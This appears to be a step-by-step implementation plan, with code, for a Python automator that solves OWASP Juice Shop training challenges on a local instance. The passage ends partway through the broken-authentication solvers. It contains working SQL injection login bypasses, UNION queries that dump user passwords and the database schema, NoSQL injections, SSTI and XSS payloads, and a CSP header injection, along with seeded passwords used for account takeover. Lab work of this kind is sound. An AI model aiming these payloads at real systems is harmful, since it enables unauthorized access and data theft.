# Juice Shop Automator — Phase 1 (Injection + XSS + Broken Authentication) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the automator framework and solve 28 of the Juice Shop's 110 target
challenges: 11 Injection, 8 XSS (of 9 — `videoXssChallenge` is deferred to the
phase that covers Vulnerable Components), and all 9 Broken Authentication.

**Architecture:** A Python CLI drives a `requests`-based client against a local
Juice Shop instance (`npm start`, not Docker). Each challenge has one solver
function registered in a global registry. A runner executes solvers and confirms
success by re-querying the live `/api/Challenges/` endpoint — never trusting a
solver's own return value. Verified directly against the Juice Shop 2026 `master`
source (`routes/login.ts`, `routes/verify.ts`, `models/user.ts`,
`models/product.ts`, `routes/search.ts`, `routes/resetPassword.ts`,
`routes/changePassword.ts`, `routes/2fa.ts`, `lib/startup/registerWebsocketEvents.ts`,
`data/static/users.yml`) fetched on 2026-08-09 — endpoints, field names, and even
several seeded users' real passwords/security answers are taken directly from
that source, not guessed.

**Tech Stack:** Python 3.11+, `requests`, `python-socketio[client]` (for the two
XSS challenges solved via WebSocket), `pyotp` (for TOTP-based 2FA), `pyyaml`
(setup only).

## Global Constraints

- Target instance: `http://localhost:3000`, started via `npm start` (Node.js
  directly), never Docker.
- No mocking. A solver is only considered done when `runner.py` observes
  `solved: true` for its key from the live `/api/Challenges/` endpoint.
- Every solver is isolated: an exception in one must not stop the others.
- Email domain for all seeded accounts is `juice-sh.op` (from
  `config/default.yml`, key `application.domain`).
- No AI/LLM-dependent solving anywhere in this phase (chatbot challenges are
  out of scope per the spec).

---

### Task 1: Framework — client, challenge API, registry, runner, report, setup, CLI

**Files:**
- Create: `core/__init__.py` (empty)
- Create: `core/client.py`
- Create: `core/challenge_api.py`
- Create: `solvers/__init__.py` (empty)
- Create: `solvers/base.py`
- Create: `core/runner.py`
- Create: `report.py`
- Create: `setup.py`
- Create: `main.py`
- Create: `requirements.txt`
- Test: `tests/test_framework.py`

**Interfaces:**
- Produces `core.client.JuiceShopClient`: `__init__(base_url="http://localhost:3000")`,
  `.register(email, password, security_question_id=1, security_answer="n/a") -> requests.Response`,
  `.login(email, password) -> requests.Response` (sets `self.token`, the
  `Authorization` header, and a `token` cookie on success; raises `RuntimeError`
  on a hard 401 that is not a 2FA prompt; returns the raw response when the
  server asks for a second factor so the caller can branch on
  `resp.json()["status"] == "totp_token_required"`), `.verify_2fa(tmp_token, totp_token) -> requests.Response`,
  `.get/.post/.put/.patch(path, **kwargs) -> requests.Response` (thin wrappers
  around `self.session.<verb>(base_url + path, **kwargs)`).
- Produces `core.challenge_api.get_challenges(client) -> list[dict]` and
  `core.challenge_api.is_solved(client, key: str) -> bool`.
- Produces `solvers.base.Solver` (dataclass: `key: str, category: str, difficulty: int, run: Callable`),
  `solvers.base.SolverContext` (dataclass: `client: JuiceShopClient, base_url: str`),
  `solvers.base.register(key, category, difficulty)` (decorator that appends to
  the module-level registry), `solvers.base.all_solvers() -> list[Solver]`.
- Produces `core.runner.run_all(base_url, categories=None, timeout=15) -> list[dict]`
  where each dict is `{key, category, solved, duration, error}`.
- Produces `report.print_report(results: list[dict]) -> None`.
- Consumes nothing from other tasks (this is the foundation).

- [ ] **Step 1: Write `requirements.txt`**

```
requests>=2.31
python-socketio[client]>=5.11
pyotp>=2.9
pyyaml>=6.0
```

- [ ] **Step 2: Write `core/client.py`**

```python
"""HTTP client wrapping a Juice Shop session (auth header + cookie)."""
import requests


class JuiceShopClient:
    def __init__(self, base_url: str = "http://localhost:3000"):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.token: str | None = None

    def _url(self, path: str) -> str:
        return f"{self.base_url}{path}"

    def register(self, email: str, password: str, security_question_id: int = 1,
                 security_answer: str = "n/a") -> requests.Response:
        payload = {
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityQuestion": {"id": security_question_id},
            "securityAnswer": security_answer,
        }
        return self.session.post(self._url("/api/Users"), json=payload)

    def login(self, email: str, password: str) -> requests.Response:
        resp = self.session.post(
            self._url("/rest/user/login"),
            json={"email": email, "password": password},
        )
        if resp.status_code == 401:
            try:
                data = resp.json()
            except ValueError:
                data = {}
            if data.get("status") == "totp_token_required":
                return resp
            raise RuntimeError(f"login failed for {email!r}: {resp.status_code} {resp.text}")
        resp.raise_for_status()
        token = resp.json()["authentication"]["token"]
        self._set_token(token)
        return resp

    def verify_2fa(self, tmp_token: str, totp_token: str) -> requests.Response:
        resp = self.session.post(
            self._url("/rest/2fa/verify"),
            json={"tmpToken": tmp_token, "totpToken": totp_token},
        )
        resp.raise_for_status()
        token = resp.json()["authentication"]["token"]
        self._set_token(token)
        return resp

    def _set_token(self, token: str) -> None:
        self.token = token
        self.session.headers["Authorization"] = f"Bearer {token}"
        self.session.cookies.set("token", token)

    def get(self, path: str, **kwargs) -> requests.Response:
        return self.session.get(self._url(path), **kwargs)

    def post(self, path: str, **kwargs) -> requests.Response:
        return self.session.post(self._url(path), **kwargs)

    def put(self, path: str, **kwargs) -> requests.Response:
        return self.session.put(self._url(path), **kwargs)

    def patch(self, path: str, **kwargs) -> requests.Response:
        return self.session.patch(self._url(path), **kwargs)
```

- [ ] **Step 3: Write `core/challenge_api.py`**

```python
"""Reads live challenge status from Juice Shop. This is the only trusted
success signal for the whole automator — solvers are never trusted directly."""
from core.client import JuiceShopClient


def get_challenges(client: JuiceShopClient) -> list[dict]:
    resp = client.get("/api/Challenges/")
    resp.raise_for_status()
    return resp.json()["data"]


def is_solved(client: JuiceShopClient, key: str) -> bool:
    for challenge in get_challenges(client):
        if challenge["key"] == key:
            return bool(challenge["solved"])
    raise KeyError(f"unknown challenge key: {key}")
```

- [ ] **Step 4: Write `solvers/base.py`**

```python
"""Solver registry. Each challenge solver module imports `register` and
decorates one function per challenge key; `all_solvers()` is consumed by
core.runner."""
from dataclasses import dataclass
from typing import Callable

from core.client import JuiceShopClient


@dataclass
class SolverContext:
    client: JuiceShopClient
    base_url: str


@dataclass
class Solver:
    key: str
    category: str
    difficulty: int
    run: Callable[[SolverContext], None]


_REGISTRY: list[Solver] = []


def register(key: str, category: str, difficulty: int):
    def decorator(fn: Callable[[SolverContext], None]):
        _REGISTRY.append(Solver(key=key, category=category, difficulty=difficulty, run=fn))
        return fn
    return decorator


def all_solvers() -> list[Solver]:
    return list(_REGISTRY)
```

- [ ] **Step 5: Write `core/runner.py`**

```python
"""Executes every registered solver against a fresh client each, then
confirms success via the live challenge API — never trusts the solver's
return value directly."""
import time

from core.challenge_api import is_solved
from core.client import JuiceShopClient
from solvers.base import all_solvers, SolverContext


def run_all(base_url: str = "http://localhost:3000", categories: list[str] | None = None,
            timeout: float = 15.0) -> list[dict]:
    results = []
    for solver in all_solvers():
        if categories and solver.category not in categories:
            continue
        client = JuiceShopClient(base_url)
        ctx = SolverContext(client=client, base_url=base_url)
        start = time.time()
        error = None
        try:
            solver.run(ctx)
        except Exception as exc:  # noqa: BLE001 - isolate one solver's failure from the rest
            error = f"{type(exc).__name__}: {exc}"
        duration = round(time.time() - start, 2)
        try:
            solved = is_solved(client, solver.key)
        except Exception as exc:  # noqa: BLE001
            solved = False
            error = error or f"{type(exc).__name__}: {exc}"
        results.append({
            "key": solver.key,
            "category": solver.category,
            "solved": solved,
            "duration": duration,
            "error": error,
        })
    return results
```

- [ ] **Step 6: Write `report.py`**

```python
"""Prints a category-grouped solved/failed table."""


def print_report(results: list[dict]) -> None:
    by_category: dict[str, list[dict]] = {}
    for r in results:
        by_category.setdefault(r["category"], []).append(r)

    total_solved = sum(1 for r in results if r["solved"])
    for category, items in sorted(by_category.items()):
        solved_count = sum(1 for i in items if i["solved"])
        print(f"\n{category} ({solved_count}/{len(items)})")
        for item in items:
            mark = "OK  " if item["solved"] else "FAIL"
            extra = f" - {item['error']}" if item["error"] else ""
            print(f"  [{mark}] {item['key']} ({item['duration']}s){extra}")

    print(f"\nTOTAL: {total_solved}/{len(results)} solved")
```

- [ ] **Step 7: Write `setup.py`**

```python
"""Clones (if needed), installs, and starts a local Juice Shop instance via
npm start (not Docker — 17 challenges are unreachable under Docker)."""
import os
import shutil
import subprocess
import time

import requests

JUICE_SHOP_REPO = "https://github.com/juice-shop/juice-shop.git"


def ensure_node() -> None:
    if shutil.which("node") is None:
        raise RuntimeError("Node.js not found on PATH. Install Node.js >= 18 first.")
    if shutil.which("npm") is None:
        raise RuntimeError("npm not found on PATH.")


def clone_if_missing(target_dir: str) -> None:
    if not os.path.isdir(target_dir):
        subprocess.run(["git", "clone", "--depth", "1", JUICE_SHOP_REPO, target_dir], check=True)


def npm_install(target_dir: str) -> None:
    if not os.path.isdir(os.path.join(target_dir, "node_modules")):
        subprocess.run(["npm", "install"], cwd=target_dir, check=True)


def start_server(target_dir: str) -> subprocess.Popen:
    return subprocess.Popen(["npm", "start"], cwd=target_dir)


def wait_ready(base_url: str = "http://localhost:3000", timeout: float = 180.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            resp = requests.get(f"{base_url}/rest/admin/application-version", timeout=2)
            if resp.status_code == 200:
                return
        except requests.RequestException:
            pass
        time.sleep(2)
    raise TimeoutError(f"Juice Shop at {base_url} did not become ready within {timeout}s")


def full_setup(target_dir: str = "./juice-shop", base_url: str = "http://localhost:3000") -> subprocess.Popen:
    ensure_node()
    clone_if_missing(target_dir)
    npm_install(target_dir)
    proc = start_server(target_dir)
    wait_ready(base_url)
    return proc
```

- [ ] **Step 8: Write `main.py`**

```python
"""CLI entrypoint."""
import argparse
import sys

# Import solver modules for their registration side-effects once they exist.
try:
    import solvers.injection  # noqa: F401
except ImportError:
    pass
try:
    import solvers.xss  # noqa: F401
except ImportError:
    pass
try:
    import solvers.broken_auth  # noqa: F401
except ImportError:
    pass

from core.runner import run_all
from report import print_report
from setup import full_setup


def main() -> None:
    parser = argparse.ArgumentParser(description="OWASP Juice Shop challenge automator")
    parser.add_argument("--setup", action="store_true", help="Clone/install/start Juice Shop first")
    parser.add_argument("--base-url", default="http://localhost:3000")
    parser.add_argument("--category", action="append", dest="categories", default=None,
                         help="Limit to one or more categories (repeatable)")
    args = parser.parse_args()

    if args.setup:
        full_setup(base_url=args.base_url)

    results = run_all(base_url=args.base_url, categories=args.categories)
    print_report(results)

    if any(not r["solved"] for r in results):
        sys.exit(1)


if __name__ == "__main__":
    main()
```

- [ ] **Step 9: Write the framework smoke test**

```python
# tests/test_framework.py
"""Live smoke test — requires a Juice Shop instance already running at
localhost:3000 (start it manually with `npm start` in a juice-shop checkout
before running this). No mocking: this project only trusts live verification."""
import pytest

from core.challenge_api import get_challenges, is_solved
from core.client import JuiceShopClient


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")


def test_get_challenges_returns_110_or_more():
    client = JuiceShopClient()
    challenges = get_challenges(client)
    assert len(challenges) >= 110


def test_is_solved_for_unknown_key_raises():
    client = JuiceShopClient()
    with pytest.raises(KeyError):
        is_solved(client, "notARealChallengeKey")


def test_login_as_demo_user_succeeds():
    client = JuiceShopClient()
    resp = client.login("demo@juice-sh.op", "demo")
    assert resp.status_code == 200
    assert client.token
```

- [ ] **Step 10: Start Juice Shop and run the smoke test**

```bash
git clone --depth 1 https://github.com/juice-shop/juice-shop.git juice-shop
cd juice-shop && npm install && npm start &
cd ..
pip install -r requirements.txt
pytest tests/test_framework.py -v
```

Expected: all 3 tests PASS (first startup can take a few minutes for `npm install`).

- [ ] **Step 11: Commit**

```bash
git add core solvers report.py setup.py main.py requirements.txt tests/test_framework.py
git commit -m "feat: add Juice Shop automator framework (client, registry, runner, setup, CLI)"
```

---

### Task 2: Injection solvers (11 challenges)

**Files:**
- Create: `solvers/injection.py`
- Test: `tests/test_injection_live.py`

**Interfaces:**
- Consumes `solvers.base.register`, `solvers.base.SolverContext`, `core.client.JuiceShopClient` from Task 1.
- Produces 11 registered solvers under category `"Injection"`. No other task depends on this file's internals — only on the fact that importing it populates the registry (already wired into `main.py` in Task 1, Step 8).

- [ ] **Step 1: Write `solvers/injection.py`**

```python
"""Injection category solvers (11 of 14 — the 3 chatbot/LLM-dependent
challenges are out of scope). Verified against Juice Shop's actual
routes/login.ts, routes/search.ts, models/product.ts, models/user.ts and
routes/order.ts source (fetched 2026-08-09)."""
import uuid

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/login.ts: verifyPostLoginChallenges just checks the resulting
# user.id after a successful login, regardless of technique. Classic
# comment-based auth bypass, one per target user. ---

@register("loginAdminChallenge", "Injection", 2)
def solve_login_admin(ctx: SolverContext) -> None:
    ctx.client.login(f"admin@{DOMAIN}'--", "irrelevant")


@register("loginBenderChallenge", "Injection", 3)
def solve_login_bender(ctx: SolverContext) -> None:
    ctx.client.login(f"bender@{DOMAIN}'--", "irrelevant")


@register("loginJimChallenge", "Injection", 3)
def solve_login_jim(ctx: SolverContext) -> None:
    ctx.client.login(f"jim@{DOMAIN}'--", "irrelevant")


# --- routes/login.ts + models/user.ts afterValidate hook: a real
# "acc0unt4nt@juice-sh.op" user can never be registered, so the only way to
# log in as one is to forge the row via UNION SELECT. Users table columns
# (models/user.ts, in declaration order + Sequelize's auto id/timestamps):
# id, username, email, password, role, deluxeToken, lastLoginIp,
# profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt (13
# columns). totpSecret must be '' to avoid the 2FA branch. ---

@register("ephemeralAccountantChallenge", "Injection", 4)
def solve_ephemeral_accountant(ctx: SolverContext) -> None:
    email = (
        "x' UNION SELECT 9999,'ephemeral','acc0unt4nt@" + DOMAIN + "','x',"
        "'accounting','','','','',1,'2020-01-01 00:00:00','2020-01-01 00:00:00',NULL-- "
    )
    ctx.client.login(email, "irrelevant")


# --- routes/search.ts: `SELECT * FROM Products WHERE ((name LIKE
# '%${criteria}%' OR description LIKE ...) AND deletedAt IS NULL) ORDER BY
# name`. Products table has exactly 9 columns (models/product.ts: id, name,
# description, price, deluxePrice, image, createdAt, updatedAt, deletedAt),
# so any UNION SELECT here needs exactly 9 columns. ---

@register("unionSqlInjectionChallenge", "Injection", 4)
def solve_union_sql_injection(ctx: SolverContext) -> None:
    q = "zzz' UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users-- "
    ctx.client.get("/rest/products/search", params={"q": q}).raise_for_status()


@register("dbSchemaChallenge", "Injection", 3)
def solve_db_schema(ctx: SolverContext) -> None:
    q = "zzz' UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master-- "
    ctx.client.get("/rest/products/search", params={"q": q}).raise_for_status()


# --- routes/trackOrder.ts: `db.ordersCollection.find({ $where:
# "this.orderId === '${id}'" })`, solved when the injected `$where` matches
# more than one order. Classic NoSQL boolean-OR breakout. ---

@register("noSqlOrdersChallenge", "Injection", 5)
def solve_nosql_orders(ctx: SolverContext) -> None:
    payload = "x' || 'x'=='x"
    ctx.client.get(f"/rest/track-order/{payload}").raise_for_status()


# --- routes/showProductReviews.ts: `db.reviewsCollection.find({ $where:
# 'this.product == ' + id })` (raw JS concat, no quotes) with a
# 2000ms-capped `sleep()` global exposed to that $where context. Injecting a
# `||sleep(9999)` forces the capped-but-still->2000ms busy-wait, tripping the
# `(t1 - t0) > 2000` timing check. ---

@register("noSqlCommandChallenge", "Injection", 4)
def solve_nosql_command(ctx: SolverContext) -> None:
    payload = "0||sleep(9999)"
    ctx.client.get(f"/rest/products/{payload}/reviews").raise_for_status()


# --- routes/updateProductReviews.ts: `db.reviewsCollection.update({ _id:
# req.body.id }, { $set: { message } }, { multi: true })`. Sending a NoSQL
# operator object instead of a literal id makes the filter match every
# document. ---

@register("noSqlReviewsChallenge", "Injection", 4)
def solve_nosql_reviews(ctx: SolverContext) -> None:
    ctx.client.patch(
        "/rest/products/reviews",
        json={"id": {"$ne": ""}, "message": "NoSQL Injection!"},
    ).raise_for_status()


# --- routes/userProfile.ts: a username matching /#{(.*)}/ unconditionally
# sets req.app.locals.abused_ssti_bug = true on GET /profile (the eval() can
# even fail, the flag is set before the try/catch). routes/verify.ts's
# serverSideChallenges(), mounted at /solve/challenges/server-side, then
# solves sstiChallenge if that flag is true and the fixed key is passed. ---

@register("sstiChallenge", "Injection", 6)
def solve_ssti(ctx: SolverContext) -> None:
    email = f"ssti.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/profile", data={"username": "#{1}"}).raise_for_status()
    ctx.client.get("/profile").raise_for_status()
    ctx.client.get(
        "/solve/challenges/server-side",
        params={"key": "tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"},
    ).raise_for_status()


# --- routes/order.ts: placing an order containing the seeded "Christmas
# Super-Surprise-Box (2014 Edition)" product solves this. The product isn't
# shown in normal browsing; find it via search first, falling back to a
# UNION SELECT that also bypasses the `deletedAt IS NULL` filter in case it
# is soft-deleted. ---

@register("christmasSpecialChallenge", "Injection", 4)
def solve_christmas_special(ctx: SolverContext) -> None:
    email = f"xmas.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    login_resp = ctx.client.login(email, "Test1234!")
    basket_id = login_resp.json()["authentication"]["bid"]

    resp = ctx.client.get("/rest/products/search", params={"q": "Christmas"})
    resp.raise_for_status()
    products = resp.json().get("data", [])
    product = next((p for p in products if "Christmas" in p.get("name", "")), None)

    if product is None:
        q = (
            "zzz' UNION SELECT id,name,description,price,deluxePrice,image,"
            "'2020-01-01 00:00:00','2020-01-01 00:00:00',NULL FROM Products "
            "WHERE name LIKE '%Christmas%'-- "
        )
        resp = ctx.client.get("/rest/products/search", params={"q": q})
        resp.raise_for_status()
        products = resp.json().get("data", [])
        product = products[0] if products else None

    if product is None:
        raise RuntimeError("could not locate the Christmas special product")

    ctx.client.post(
        "/api/BasketItems",
        json={"ProductId": product["id"], "BasketId": basket_id, "quantity": 1},
    ).raise_for_status()
    ctx.client.post(f"/rest/basket/{basket_id}/checkout").raise_for_status()
```

- [ ] **Step 2: Write the live verification test**

```python
# tests/test_injection_live.py
"""No mocking, per project convention: this runs the real solvers against a
live Juice Shop instance (started per tests/test_framework.py Step 10) and
checks the live score-board."""
import pytest

import solvers.injection  # noqa: F401 - registers the solvers
from core.challenge_api import is_solved
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

INJECTION_KEYS = [
    "loginAdminChallenge", "loginBenderChallenge", "loginJimChallenge",
    "ephemeralAccountantChallenge", "unionSqlInjectionChallenge", "dbSchemaChallenge",
    "noSqlOrdersChallenge", "noSqlCommandChallenge", "noSqlReviewsChallenge",
    "sstiChallenge", "christmasSpecialChallenge",
]


def test_all_injection_challenges_solved():
    results = run_all(categories=["Injection"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in INJECTION_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 3: Run the live test against the running instance**

```bash
pytest tests/test_injection_live.py -v
```

Expected: PASS. If a specific key fails, `results` in the assertion message
shows the exact HTTP response captured in `error` — fix the payload for that
one solver function and rerun; do not touch the others.

- [ ] **Step 4: Commit**

```bash
git add solvers/injection.py tests/test_injection_live.py
git commit -m "feat: solve 11 Injection challenges"
```

---

### Task 3: XSS solvers (8 of 9 challenges — videoXssChallenge deferred)

**Files:**
- Create: `solvers/xss.py`
- Test: `tests/test_xss_live.py`
- Modify: `requirements.txt` (already includes `python-socketio[client]` from Task 1)

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from Task 1.
- Produces 8 registered solvers under category `"XSS"`.

- [ ] **Step 1: Write `solvers/xss.py`**

```python
"""XSS category solvers (8 of 9 — videoXssChallenge needs the Arbitrary File
Write exploit first and is solved alongside Vulnerable Components in a later
phase). Verified against models/user.ts, models/product.ts, models/feedback.ts,
routes/trackOrder.ts, routes/saveLoginIp.ts, routes/userProfile.ts,
routes/updateUserProfile.ts, routes/profileImageUrlUpload.ts and
lib/startup/registerWebsocketEvents.ts (fetched 2026-08-09). All but two of
these are solved with pure HTTP requests — no browser needed, because Juice
Shop's server-side "solved" checks look at the raw data it received, not at
whether a script actually executed in a browser."""
import uuid

import socketio

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"
IFRAME_PAYLOAD = '<iframe src="javascript:alert(`xss`)">'


# --- models/product.ts description setter: solved the instant a product's
# description (set via any API call, e.g. PUT /api/Products/:id) contains the
# payload — the challenge is literally named "API-only". ---

@register("restfulXssChallenge", "XSS", 3)
def solve_restful_xss(ctx: SolverContext) -> None:
    email = f"xss.rest.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    resp = ctx.client.get("/rest/products/search", params={"q": ""})
    resp.raise_for_status()
    products = resp.json()["data"]
    product_id = products[0]["id"]
    ctx.client.put(f"/api/Products/{product_id}", json={"description": IFRAME_PAYLOAD}).raise_for_status()


# --- models/feedback.ts comment setter: sanitizeHtml() is applied but still
# lets this exact iframe payload through when the feedback comment field
# contains it. ---

@register("persistedXssFeedbackChallenge", "XSS", 4)
def solve_persisted_xss_feedback(ctx: SolverContext) -> None:
    ctx.client.post(
        "/api/Feedbacks",
        json={"comment": IFRAME_PAYLOAD, "rating": 1},
    ).raise_for_status()


# --- models/user.ts email setter: while persistedXssUserChallenge is
# unsolved, the EMAIL field (not username) is checked verbatim for the
# payload on any user create. Registering directly via the API bypasses the
# frontend's client-side email format validation. ---

@register("persistedXssUserChallenge", "XSS", 3)
def solve_persisted_xss_user(ctx: SolverContext) -> None:
    email = f'{IFRAME_PAYLOAD}.{uuid.uuid4().hex[:8]}@{DOMAIN}'
    ctx.client.register(email, "Test1234!")


# --- routes/trackOrder.ts: reflectedXssChallenge is solved purely if the
# `:id` path segment contains the payload — a plain GET, no order needs to
# exist. ---

@register("reflectedXssChallenge", "XSS", 2)
def solve_reflected_xss(ctx: SolverContext) -> None:
    ctx.client.get(f"/rest/track-order/{IFRAME_PAYLOAD}")


# --- routes/saveLoginIp.ts: solved if the `True-Client-Ip` request header is
# literally the payload string when calling GET /rest/saveLoginIp while
# authenticated. ---

@register("httpHeaderXssChallenge", "XSS", 4)
def solve_http_header_xss(ctx: SolverContext) -> None:
    email = f"xss.hdr.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.get("/rest/saveLoginIp", headers={"True-Client-Ip": IFRAME_PAYLOAD}).raise_for_status()


# --- lib/startup/registerWebsocketEvents.ts: localXssChallenge and
# xssBonusChallenge are solved purely by emitting a `verifyLocalXssChallenge`
# Socket.IO event with the right payload string — the frontend does this
# whenever the product search box changes, so we can just do it directly. ---

XSS_BONUS_PAYLOAD = (
    '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" '
    'src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076'
    '&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true'
    '&show_reposts=false&show_teaser=true"></iframe>'
)


def _emit_verify_local_xss(base_url: str, payload: str) -> None:
    sio = socketio.SimpleClient()
    sio.connect(base_url, transports=["websocket"])
    try:
        sio.emit("verifyLocalXssChallenge", payload)
        sio.sleep(1)
    finally:
        sio.disconnect()


@register("localXssChallenge", "XSS", 1)
def solve_local_xss(ctx: SolverContext) -> None:
    _emit_verify_local_xss(ctx.base_url, IFRAME_PAYLOAD)


@register("xssBonusChallenge", "XSS", 1)
def solve_xss_bonus(ctx: SolverContext) -> None:
    _emit_verify_local_xss(ctx.base_url, XSS_BONUS_PAYLOAD)


# --- routes/userProfile.ts CSP header is built as
# `img-src 'self' ${user.profileImage}; script-src 'self' 'unsafe-eval'` with
# no encoding, so a profileImage value containing "; script-src
# 'unsafe-inline'" injects that directive. Combined with a literal
# "<script>alert(`xss`)</script>" username (which must NOT match /#{(.*)}/,
# or it goes down the SSTI eval branch instead), GET /profile solves it. Both
# /profile and /profile/image/url authenticate via the `token` cookie, which
# core.client.JuiceShopClient._set_token already sets on login. ---

@register("usernameXssChallenge", "XSS", 4)
def solve_username_xss(ctx: SolverContext) -> None:
    email = f"xss.csp.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/profile/image/url",
        data={"imageUrl": "https://x.invalid/pic.jpg; script-src 'unsafe-inline'"},
    )
    ctx.client.post("/profile", data={"username": "<script>alert(`xss`)</script>"}).raise_for_status()
    ctx.client.get("/profile").raise_for_status()
```

- [ ] **Step 2: Write the live verification test**

```python
# tests/test_xss_live.py
import pytest

import solvers.xss  # noqa: F401
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

XSS_KEYS = [
    "restfulXssChallenge", "persistedXssFeedbackChallenge", "persistedXssUserChallenge",
    "reflectedXssChallenge", "httpHeaderXssChallenge", "localXssChallenge",
    "xssBonusChallenge", "usernameXssChallenge",
]


def test_all_phase1_xss_challenges_solved():
    results = run_all(categories=["XSS"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in XSS_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 3: Run the live test**

```bash
pip install -r requirements.txt
pytest tests/test_xss_live.py -v
```

Expected: PASS. `usernameXssChallenge` is the highest-risk one in this file
(it depends on exact CSP header string matching) — if it fails, inspect the
`Content-Security-Policy` response header from `GET /profile` directly and
adjust the injected `imageUrl` string until the regex
`;[ ]*script-src(.)*'unsafe-inline'` matches it.

- [ ] **Step 4: Commit**

```bash
git add solvers/xss.py tests/test_xss_live.py
git commit -m "feat: solve 8 of 9 XSS challenges (videoXssChallenge deferred)"
```

---

### Task 4: Broken Authentication solvers (9 challenges)

**Files:**
- Create: `solvers/broken_auth.py`
- Test: `tests/test_broken_auth_live.py`

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from Task 1.
- Produces 9 registered solvers under category `"Broken Authentication"`.

- [ ] **Step 1: Write `solvers/broken_auth.py`**

```python
"""Broken Authentication solvers (all 9). Verified against
data/static/users.yml (real seeded plaintext passwords and security-question
answers for this exact fixed dataset), routes/login.ts
(verifyPreLoginChallenges/verifyPostLoginChallenges), routes/changePassword.ts,
routes/resetPassword.ts, and routes/2fa.ts (fetched 2026-08-09). None of these
need SQL injection — Juice Shop's own seed data or its documented "weak"
flows are the intended solutions, and the server-side checks confirm that."""
import pyotp

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/login.ts verifyPreLoginChallenges: solved by literally logging
# in with the seeded admin credentials (admin/admin123) — the challenge is
# about the password being guessable, not about bypassing auth. ---

@register("weakPasswordChallenge", "Broken Authentication", 2)
def solve_weak_password(ctx: SolverContext) -> None:
    ctx.client.login(f"admin@{DOMAIN}", "admin123")


# --- routes/login.ts verifyPreLoginChallenges: Bjoern's Google account in
# the seed data has its real password stored in users.yml too. ---

@register("oauthUserPasswordChallenge", "Broken Authentication", 4)
def solve_oauth_user_password(ctx: SolverContext) -> None:
    ctx.client.login("bjoern.kimminich@gmail.com", "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=")


# --- routes/login.ts verifyPostLoginChallenges: solved by user.id ===
# users.chris.id after a successful login, regardless of technique — Chris's
# seeded (soft-deleted) account still has a valid password. ---

@register("ghostLoginChallenge", "Broken Authentication", 3)
def solve_ghost_login(ctx: SolverContext) -> None:
    ctx.client.login("chris.pike@" + DOMAIN, "uss enterprise")


# --- routes/changePassword.ts: `challengeUtils.solveIf(
# changePasswordBenderChallenge, () => user.id === 3 && !currentPassword &&
# user.password === hash('slurmCl4ssic'))`. Log in as Bender with his real
# seeded password, then call change-password with only `new`/`repeat` (no
# `current`). ---

@register("changePasswordBenderChallenge", "Broken Authentication", 5)
def solve_change_password_bender(ctx: SolverContext) -> None:
    ctx.client.login(f"bender@{DOMAIN}", "OhG0dPlease1nsertLiquor!")
    ctx.client.get(
        "/rest/user/change-password",
        params={"new": "slurmCl4ssic", "repeat": "slurmCl4ssic"},
    ).raise_for_status()


# --- routes/resetPassword.ts verifySecurityAnswerChallenges: each of these
# checks the exact user id AND the exact security answer string. The answers
# below are the real seeded values from data/static/users.yml, not guesses. ---

def _reset_password(ctx: SolverContext, email: str, answer: str, new_password: str) -> None:
    ctx.client.post(
        "/rest/user/reset-password",
        json={"email": email, "answer": answer, "new": new_password, "repeat": new_password},
    ).raise_for_status()


@register("resetPasswordJimChallenge", "Broken Authentication", 3)
def solve_reset_password_jim(ctx: SolverContext) -> None:
    _reset_password(ctx, f"jim@{DOMAIN}", "Samuel", "NewJimPassword1!")


@register("resetPasswordBenderChallenge", "Broken Authentication", 4)
def solve_reset_password_bender(ctx: SolverContext) -> None:
    _reset_password(ctx, f"bender@{DOMAIN}", "Stop'n'Drop", "NewBenderPassword1!")


